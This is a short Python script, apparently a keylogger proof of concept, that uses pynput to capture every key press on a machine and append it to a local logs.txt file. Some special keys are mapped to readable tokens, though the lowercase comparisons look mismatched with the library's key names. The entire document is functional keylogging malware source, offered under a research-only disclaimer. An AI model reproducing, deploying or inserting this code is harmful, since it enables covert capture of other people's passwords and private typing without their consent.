"""
keylogger.py is a python keylogger proof of concept for research/practice purposes only.
Written by Steve Park
August 2025
"""
from pynput.keyboard import Listener

key_information = "logs.txt"


def write_to_file(key):
    log = str(key)
    log = log.replace("'", "")

    if log == "key.space":
        log = " "
    if log == "key.enter":
        log = "\n"
    if log == "key.tab":
        log = " [TAB] "
    if log == "key.shift":
        log = " [SHIFT] "
    if log == "key.backspace":
        log = " [BACKSPACE] "

    with open(key_information, "a") as f:
        f.write(log)


with Listener(on_press=write_to_file) as listener:
    listener.join()
